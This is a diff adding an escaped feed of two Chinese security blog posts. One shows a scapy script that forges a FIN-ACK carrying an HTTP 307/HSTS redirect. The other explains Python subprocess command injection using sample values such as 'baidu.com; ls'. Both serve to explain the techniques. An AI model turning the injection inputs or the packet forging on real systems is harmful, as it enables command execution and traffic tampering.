+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;build_finack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+    带重定向指令的包
+    &quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;FA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MSS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1460&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;HTTP/1.1 307 Internal Redirect&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+           &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Length: 0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+           &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Location: https://&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s:443&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+           &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Strict-Transport-Security: max-age=31536000&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+           &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SERVER_DOMAIN&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;build_ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MSS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1460&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handle_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# 如果是 SYN 就回复 SYN-ACK 和 FIN-ACK&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SYN&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;build_synack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SYN ACK sent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;build_finack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;FIN ACK sent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FIN&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# 如果不 ACK，客户端可能一直重传&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;build_ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ACK sent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# 对于 TCP 和 SERVER PORT 端口的包，回调 handle_packet 函数&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tcp and port &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SERVER_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handle_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;使用 scapy 框架，监听一个端口，在接收到 SYN 包之后，按照正常的握手流程返回 SYN-ACK，然后不等接收到 ACK 就继续发送 FIN-ACK，告诉客户端我要断开连接了，然后在这个包中包含有重定向的 HTTP 包。&lt;/p&gt;
+
+&lt;p&gt;在服务器端视角看是这样的&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/789/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在客户端视角看是这样的&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/789/3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;42 号包是代码的重定向，47 号包就是防火墙的重定向，可以看到 TTL 明显不一致，而且 seq 被我们代码扰乱，导致被认为 out-of-order 了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/789/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因为 scapy 是用户态的，防止内核不知道整个连接流程而发送 rst 包，可以使用下面的命令屏蔽掉&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 172.21.0.3 -j DROP
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;也有人使用内核模块实现了这个功能&lt;/p&gt;
+
+&lt;p&gt;https://github.com/ptpt52/hstshack&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="安全" /><summary type="html">关于 TCP 建立连接和断开连接的流程，很多人都能大致说出来，可以参考协议森林</summary></entry><entry><title type="html">subprocess 参数绑定与命令注入</title><link href="https://strcpy.me/index.php/archives/787/" rel="alternate" type="text/html" title="subprocess 参数绑定与命令注入" /><published>2018-03-01T23:46:07+00:00</published><updated>2018-03-01T23:46:07+00:00</updated><id>https://strcpy.me/index.php/archives/subprocess%20%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5</id><content type="html" xml:base="https://strcpy.me/index.php/archives/787/">&lt;p&gt;使用了 subprocess 传递数组形式的 args 过去就一定没有命令注入的问题么？&lt;/p&gt;
+
+&lt;p&gt;一般认为说这样的代码是存在命令注入问题的，比如&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;baidu.com&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ping -c 1 &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ping -c 1 &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;如果 &lt;code class=&quot;highlighter-rouge&quot;&gt;host = &quot;baidu.com; ls&quot;&lt;/code&gt; 就可以执行 &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; 了&lt;/p&gt;
+
+&lt;p&gt;推荐的做法是&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;args is required for all calls and should be a string, or a sequence of program arguments. Providing a sequence of arguments is generally preferred, as it allows the module to take care of any required escaping and quoting of arguments (e.g. to permit spaces in file names). If passing a single string, either shell must be True (see below) or else the string must simply name the program to be executed without specifying any arguments.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;所以写法应该修改为&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ping&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;如果传入 &lt;code class=&quot;highlighter-rouge&quot;&gt;host = &quot;baidu.com; ls&quot;&lt;/code&gt;，就会提示 &lt;code class=&quot;highlighter-rouge&quot;&gt;ping: cannot resolve baidu.com; ls: Unknown host&lt;/code&gt;，那是因为 ping 会把最后一个参数看做一个整体。下面是另外一个 demo&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;baidu.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;baidu.com; echo 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ping.py -c 1 &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ping.py -c 1 &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
